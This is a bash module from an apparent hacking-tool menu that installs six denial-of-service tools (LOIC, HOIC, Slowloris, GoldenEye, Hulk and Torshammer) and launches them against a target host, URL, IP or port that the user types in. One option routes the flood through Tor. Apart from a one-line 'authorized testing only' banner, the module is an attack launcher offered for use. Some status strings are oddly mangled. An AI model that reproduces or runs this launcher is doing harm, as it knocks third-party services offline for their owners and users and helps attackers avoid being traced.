#!/bin/bash

# DDOS Attack Tools Module

ddos_menu() {
    while true; do
        show_banner
        echo -e "${PURPLE}╔════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${PURPLE}║${BOLD}${WHITE}                DDOS ATTACK TOOLS                         ${PURPLE}║${NC}"
        echo -e "${PURPLE}╚════════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${RED}${BOLD}⚠  WARNING: Use only for authorized testing! ⚠${NC}"
        echo ""
        echo -e "${CYAN}1)${NC} LOIC - Low Orbit Ion Cannon"
        echo -e "${CYAN}2)${NC} HOIC - High Orbit Ion Cannon"
        echo -e "${CYAN}3)${NC} Slowloris - HTTP DoS"
        echo -e "${CYAN}4)${NC} GoldenEye - HTTP DoS"
        echo -e "${CYAN}5)${NC} Hulk - HTTP DoS"
        echo -e "${CYAN}6)${NC} Torshammer - Tor-based DoS"
        echo ""
        echo -e "${YELLOW}0)${NC} Back to Main Menu"
        echo ""
        echo -e "${PURPLE}════════════════════════════════════════════════════════════${NC}"
        echo -ne "${BOLD}${WHITE}Select option: ${NC}"
        read -r choice

        case $choice in
            1) loic_tool ;;
            2) hoic_tool ;;
            3) slowloris_tool ;;
            4) goldeneye_tool ;;
            5) hulk_tool ;;
            6) torshammer_tool ;;
            0) return ;;
            *) echo -e "${RED}[X[*] Invalid option${NC}"; pause ;;
        esac
    done
}

loic_tool() {
    show_banner
    echo -e "${PURPLE}═══ LOIC - Low Orbit Ion Cannon ═══${NC}"
    echo ""
    echo -e "${CYAN}1)${NC} Install LOIC"
    echo -e "${CYAN}2)${NC} Run LOIC"
    echo -e "${CYAN}0)${NC} Back"
    echo ""
    echo -ne "${BOLD}${WHITE}Select option: ${NC}"
    read -r choice

    case $choice in
        1)
            echo -e "${YELLOW}[*[*] Installing LOIC...${NC}"
            git clone https://github.com/NewEraCracker/LOIC.git
            echo -e "${GREEN}[+[*] LOIC installed${NC}"
            pause
            ;;
        2)
            echo -e "${YELLOW}[*[*] LOIC requires Windows/.NET or Mono${NC}"
            cd LOIC && mono LOIC.exe
            cd ..
            ;;
        0) return ;;
    esac
}

hoic_tool() {
    show_banner
    echo -e "${PURPLE}═══ HOIC - High Orbit Ion Cannon ═══${NC}"
    echo ""
    echo -e "${CYAN}1)${NC} Download HOIC Info"
    echo -e "${CYAN}0)${NC} Back"
    echo ""
    echo -ne "${BOLD}${WHITE}Select option: ${NC}"
    read -r choice

    case $choice in
        1)
            echo -e "${YELLOW}[*[*] HOIC is a Windows-only tool${NC}"
            echo -e "${CYAN}Download from: https://sourceforge.net/projects/high-orbit-ion-cannon/${NC}"
            pause
            ;;
        0) return ;;
    esac
}

slowloris_tool() {
    show_banner
    echo -e "${PURPLE}═══ Slowloris - HTTP DoS ═══${NC}"
    echo ""
    echo -e "${CYAN}1)${NC} Install Slowloris"
    echo -e "${CYAN}2)${NC} Run Slowloris Attack"
    echo -e "${CYAN}0)${NC} Back"
    echo ""
    echo -ne "${BOLD}${WHITE}Select option: ${NC}"
    read -r choice

    case $choice in
        1)
            echo -e "${YELLOW}[*[*] Installing Slowloris...${NC}"
            sudo pip3 install slowloris
            echo -e "${GREEN}[+[*] Slowloris installed${NC}"
            pause
            ;;
        2)
            echo -ne "${WHITE}Enter target (e.g., example.com): ${NC}"
            read -r target
            echo -ne "${WHITE}Enter number of sockets (default 150): ${NC}"
            read -r sockets
            sockets=${sockets:-150}
            slowloris "$target" -s "$sockets"
            pause
            ;;
        0) return ;;
    esac
}

goldeneye_tool() {
    show_banner
    echo -e "${PURPLE}═══ GoldenEye - HTTP DoS ═══${NC}"
    echo ""
    echo -e "${CYAN}1)${NC} Install GoldenEye"
    echo -e "${CYAN}2)${NC} Run GoldenEye Attack"
    echo -e "${CYAN}0)${NC} Back"
    echo ""
    echo -ne "${BOLD}${WHITE}Select option: ${NC}"
    read -r choice

    case $choice in
        1)
            echo -e "${YELLOW}[*[*] Installing GoldenEye...${NC}"
            git clone https://github.com/jseidl/GoldenEye.git
            echo -e "${GREEN}[+[*] GoldenEye installed${NC}"
            pause
            ;;
        2)
            echo -ne "${WHITE}Enter target URL: ${NC}"
            read -r target
            cd GoldenEye && python3 goldeneye.py "$target"
            cd ..
            ;;
        0) return ;;
    esac
}

hulk_tool() {
    show_banner
    echo -e "${PURPLE}═══ Hulk - HTTP DoS ═══${NC}"
    echo ""
    echo -e "${CYAN}1)${NC} Install Hulk"
    echo -e "${CYAN}2)${NC} Run Hulk Attack"
    echo -e "${CYAN}0)${NC} Back"
    echo ""
    echo -ne "${BOLD}${WHITE}Select option: ${NC}"
    read -r choice

    case $choice in
        1)
            echo -e "${YELLOW}[*[*] Installing Hulk...${NC}"
            git clone https://github.com/grafov/hulk.git
            echo -e "${GREEN}[+[*] Hulk installed${NC}"
            pause
            ;;
        2)
            echo -ne "${WHITE}Enter target URL: ${NC}"
            read -r target
            cd hulk && python3 hulk.py "$target"
            cd ..
            ;;
        0) return ;;
    esac
}

torshammer_tool() {
    show_banner
    echo -e "${PURPLE}═══ Torshammer - Tor-based DoS ═══${NC}"
    echo ""
    echo -e "${CYAN}1)${NC} Install Torshammer"
    echo -e "${CYAN}2)${NC} Run Torshammer"
    echo -e "${CYAN}0)${NC} Back"
    echo ""
    echo -ne "${BOLD}${WHITE}Select option: ${NC}"
    read -r choice

    case $choice in
        1)
            echo -e "${YELLOW}[*[*] Installing Torshammer...${NC}"
            git clone https://github.com/dotfighter/torshammer.git
            echo -e "${GREEN}[+[*] Torshammer installed${NC}"
            pause
            ;;
        2)
            echo -ne "${WHITE}Enter target IP: ${NC}"
            read -r ip
            echo -ne "${WHITE}Enter target port: ${NC}"
            read -r port
            cd torshammer && python torshammer.py -t "$ip" -p "$port"
            cd ..
            ;;
        0) return ;;
    esac
}
